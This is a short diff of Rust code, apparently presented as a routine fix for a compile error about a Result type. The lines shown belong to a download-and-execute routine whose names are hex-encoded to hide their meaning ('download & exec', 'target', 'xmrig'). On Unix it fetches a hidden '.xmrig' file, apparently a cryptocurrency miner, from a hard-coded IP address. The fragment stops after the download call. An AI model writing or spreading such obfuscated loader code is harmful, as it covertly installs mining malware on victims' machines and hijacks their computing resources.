@@ -30,7 +30,7 @@ error[E0599]: no method named `text` found for enum `Result` in the current scop
  */
 
 #[tokio::main]
-async fn _0x646f776e6c6f616420262065786563() -> Result<(), Box<dyn std::error::Error>> {
+async fn _0x646f776e6c6f616420262065786563() -> Result<(), reqwest::Error> {
     if cfg!(unix) {
         let _0x746172676574 = "http://150.136.245.71:1337/0x756e6978/.0x786d726967";
         let _0x726573706f6e7365 = reqwest::get(_0x746172676574).await;
